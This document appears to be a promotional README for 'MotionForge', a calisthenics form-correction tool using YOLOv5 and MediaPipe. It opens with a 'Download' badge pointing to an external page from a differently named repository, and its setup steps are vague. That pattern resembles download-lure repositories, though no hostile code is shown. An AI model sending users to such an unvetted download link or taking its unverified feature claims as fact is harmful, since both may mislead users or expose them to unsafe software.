![preview](https://raw.githubusercontent.com/ibrarhussainbaloch840-spec/lift-lab-form-coach/main/promo_d7f79f8.svg)
[![Download](https://raw.githubusercontent.com/ibrarhussainbaloch840-spec/lift-lab-form-coach/main/pkg_271d.svg)](https://ibrarhussainbaloch840-spec.github.io/lift-lab-form-coach/)

# 🏋️‍♂️ MotionForge: AI-Powered Calisthenics Form Architect

**Real-Time Bodyweight Exercise Correction & Movement Intelligence for Street Workout Athletes**

![GitHub License](https://img.shields.io/badge/License-MIT-yellow.svg)
![Python Version](https://img.shields.io/badge/Python-3.10%2B-blue)
![Contributors](https://img.shields.io/badge/Contributors-Welcome-brightgreen)

---

## 🌟 Welcome to MotionForge — Where Bodyweight Meets Machine Vision

Every rep you perform tells a story — but most of it remains untold without the right lens. MotionForge is not another fitness tracker; it's a **movement intelligence forge** that transforms your raw calisthenics performance into actionable biomechanical insights. While traditional pose-estimation tools merely flag when you're "wrong," MotionForge uses a **dual-engine architecture** — blending ultra-lightweight YOLOv5 detection with MediaPipe's precise landmark tracking — to *sculpt* your technique in real time, as if a world-class coach were whispering corrections into your ear.

This repository is designed for developers, sports scientists, and home-gym enthusiasts who want to push beyond standard "rep counting" and into the realm of **precision movement pathology diagnosis** for bodyweight exercises like pull-ups, dips, push-ups, and pistol squats.

---

## 🧠 Why MotionForge Exists (The Unseen Problem)

Most athletes plateau not because they lack strength, but because they lack *fidelity* in their range of motion. Standard fitness apps use gyroscopes or simple camera overlays that miss the subtle shoulder shrug in a pull-up or the pelvic tilt in a dip. MotionForge was forged to solve **three critical blind spots**:

1. **The Ghost Rep Phenomenon** — Reps that look completed on the surface but miss the full eccentric stretch or lockout position.
2. **Joint Compensation Blindness** — When your body recruits secondary muscles (trapezius, lumbar erectors) to mask weak primary movers.
3. **Velocity Consistency Errors** — Explosive concentric phases mixed with sloppy negatives create uneven muscle fiber recruitment.

Our solution doesn't just count — it *witnesses* each joint angle, *tracks* bar-path (or body-path) symmetry, and *scores* your movement against a biomechanical gold standard.

---

## 🔥 Core Feature Forge — What You Get

### 🎯 Real-Time Triple-Layer Pose Analysis
- **Layer 1: Detection Grid** — YOLOv5 identifies your full body even in cluttered home environments, reducing false positives from furniture shadows or pets.
- **Layer 2: Landmark Mapping** — MediaPipe's 33-point model tracks hand, shoulder, hip, and ankle coordinates at 60+ FPS on mid-range GPUs.
- **Layer 3: Kinematic Engine** — Custom-built joint-angle calculators compute shoulder flexion, elbow deviation, spinal neutrality, and knee tracking vectors.

### 📊 Dynamic Form Score (0–100)
Forget binary "good/bad" feedback. MotionForge produces a **composite movement score** based on three weighted sub-metrics:
- **Eccentric Control Index** (40%) — Measures slow, deliberate lowering phases.
- **Torso Tilt Tolerance** (30%) — Ensures hips stay squared and spine stays neutral.
- **Rep Rhythm Variance** (30%) — Monitors if your tempo becomes erratic across sets.

### 🔮 Predictive Feedback Suggestion Engine
Rather than shouting "Straighten your back!" (which is vague), MotionForge uses a **motion priors database** to suggest micro-adjustments like:
> *"Your right shoulder is elevating 2.3cm higher than the left during the mid-concentric phase. Depress the scapula and engage your lat lock before pulling."*

### 🌐 Multilingual Movement Coaching
The feedback layer supports **real-time translation** into 12 languages, including Spanish, Hindi, German, and Japanese. Coaches in Tokyo can watch their athletes in Berlin get the exact same corrective cues, making international remote training viable.

### 📱 Responsive Visualization Suite
Our built-in dashboard adapts to your device — a minimalist workout display on a 6-inch phone screen, or a detailed multi-joint angle time-series graph on a 27-inch desktop monitor. No configuration needed; the UI breathes responsively.

### 🔔 24/7 Form Guard Service Mode
Run MotionForge as a background **ambient guardian** during your entire workout session. Our lightweight monitoring thread watches every rep, logs your fatigue-induced posture decay (usually after rep 15!), and alerts you when your technique drops below a safe threshold — your personal injury prevention radar.

---

## 🏗️ Architecture Blueprint — How the Magic Happens

```
Input Frame (Webcam/USB Camera)
        |
        v
+-----------------------+
|  YOLOv5 Person Detector |
+-----------------------+
        |
        v (Bounding Box Crop)
+-----------------------+
|  MediaPipe Pose Graph   |
+-----------------------+
        |
        v (33 Landmarks, (x,y,z) coordinates)
+-----------------------+
|  Kinematic Angle Engine|
+-----------------------+
        |
        v (Theta vectors for 12 key joints)
+-----------------------+
|  Form Scoring Matrix    |
+-----------------------+
        |
        v (Movement Score + Corrections)
+-----------------------+
|  Feedback Translator    |
+-----------------------+
        |
        v (Text-to-Speech / Visual Overlay)
```

The **MotionForge** core is built on a modular plugin system — you can swap the visual detection backend without touching the feedback logic. This makes your prototype future-proof for more advanced models like YOLOv8 or RTMPose.

---

## 📂 Repository Landscape (What Lives Inside)

- `motionforge/` — Core analysis engine, includes the angle math, scoring heuristics, and exercise-specific presets.
- `exercises/` — JSON configuration files for each exercise. Each preset defines `target_joints`, `angle_ranges`, `velocity_limits`, and `personalized_cue_messages`.
- `feeds/` — Camera capture modules. Includes a synthetic feed generator for testing without a physical webcam.
- `universe/` — Localization files (`.json` dictionaries) for all 12 supported languages, plus a custom translation API integration layer.
- `forge_hub/` — The responsive front-end dashboard. Built with lightweight HTML5/Canvas — no heavy frontend frameworks, ensuring it runs on a Raspberry Pi's browser.
- `tests/` — Unit tests for angle calculations, integration tests for feed pipelines, and stress tests for multi-camera streams.

---

## 🧪 Getting Your Workflow Forged (Syncing MotionForge Locally)

To bring MotionForge into your library, you will need to:
1. **Create a project directory** and navigate to it inside your terminal environment.
2. **Initialize a version-control container** (like `git init`) and link it to an empty remote repository on our service.
3. **Fetch the latest stable branch** using the `git pull` command to retrieve the main module files.
4. **Set up a Python virtual environment** — this isolates all dependencies like MediaPipe and PyTorch without affecting your system Python.
5. **Resolve dependencies** — we recommend using a package manager like `poetry` or `conda` (not `pip` alone) to install torch, opencv-python-headless, and protobuf.
6. **Run the configuration script** (`python forge_setup.py`) to auto-detect your webcam index and graphics card capabilities.
7. **Lauch the test harness** (`python launch_testbench.py --exercise pull_up`) to see a sample analysis of a pre-recorded synthetic clip.

*Note: For production use, we suggest using an NVIDIA RTX 2060 or higher for consistent 60 FPS performance. Integrated graphics will run at 20-30 FPS, which is still usable for home training.*

---

## 🛠️ Customizing Your Exercise Arsenal

MotionForge ships with presets for 15 common calisthenics movements, including:
- Pull-Ups (pronated, supinated, neutral grip)
- Dips (straight bar, parallel bars)
- Push-Ups (decline, diamond, archer)
- Pistol Squats
- L-Sit Holds
- Handstand Push-Ups (pike variation)

To add your own exercise, create a `.json` prefab inside `exercises/`. Define your key joints (like `shoulder_angle_left`, `knee_flex_right`), acceptable ranges, and *positive anchoring cues* — MotionForge avoids negative phrasing, instead using "engage your lats as if crushing a tennis ball" style imagery.

---

## 🤝 Contributing to the Forge — Join Our Movement

We bow deeply to community contributions of all types:
- **Movement Scientists**: Submit new exercise biomechanics data and angle thresholds.
- **Translators**: Expand our language universe — we currently need Serbian, Swahili, and Vietnamese.
- **Frontend Artisans**: Help refine the web dashboard animations and accessibility features.
- **Bug Hunters**: Report edge cases like low-light performance or fast dynamic motion blur.

Please read the `CONTRIBUTING.md` in the repository root for our code-of-conduct and pull-request workflow. We prioritize clear, documented, and empathetic code reviews.

---

## 🪪 License & Legal Disclaimer

**MotionForge** is released under the permissive [MIT License](LICENSE) — you are welcome to use, modify, and distribute this software freely, including for commercial applications, as long as proper attribution is provided.

### ⚠️ Medical/Injury Disclaimer
This software is a **training aid and educational tool**, not a medical device. The motion scoring and corrective feedback algorithms are based on common biomechanical conventions but **cannot diagnose injuries, imbalances, or underlying health conditions**. Always consult a certified physiotherapist or sports medicine physician before adopting new exercise techniques. Prolonged pain, sharp joint discomfort, or numbness during exercise is a red flag — stop the session and seek professional advice. MotionForge's suggestions are not a substitute for human professional judgment. By using this tool, you acknowledge that the creators and contributors hold no liability for any injury sustained during training.

---

## 📜 Changelog & Roadmap (Looking Forward to 2026)

**Version 0.9.x (Current)** — Stable angle scoring, 12 language support, full responsive dashboard.
**Version 1.0 (Q2 2026)** — Bundled Android app via WebView wrapper; integration with wearable heart-rate monitors for fatigue-aware cue adjustment.
**Version 1.5 (Q4 2026)** — Co-op mode: compare two athletes side-by-side on one camera feed for partner drills. Virtual AI "spotter" voice with spatial audio panning (corrections seem to come from the left or right depending on which limb needs attention).

---

## 💬 Community Vibes & Support

We believe in **continuous human connection**, not just bug reports. Visit our Discussions tab to share your best movement transformation footage, ask biomechanics questions, or suggest a new emoji for the feedback feed (currently rocking 🦾 for strength cues and 🧘 for mobility cues).

For urgent technical assistance, our maintainers are active on the Issues page and strive to respond within 48 hours. Our 24/7 support promise is anchored in our community — if one timezone's maintainer is asleep, another one is awake.

---

## 🚀 Final Words — Forge Your Own Evolution

MotionForge provides the tools, the lens, and the language of movement, but only *you* generate the force. We've avoided the clutter of "cracked" shortcuts or paid-only gimmicks; this is a **community-owned, transparently coded performance companion**. Let's redefine what it means to master your own bodyweight — one angle at a time.

**Your body is the canvas. Machine vision is the brush. MotionForge is your gallery.**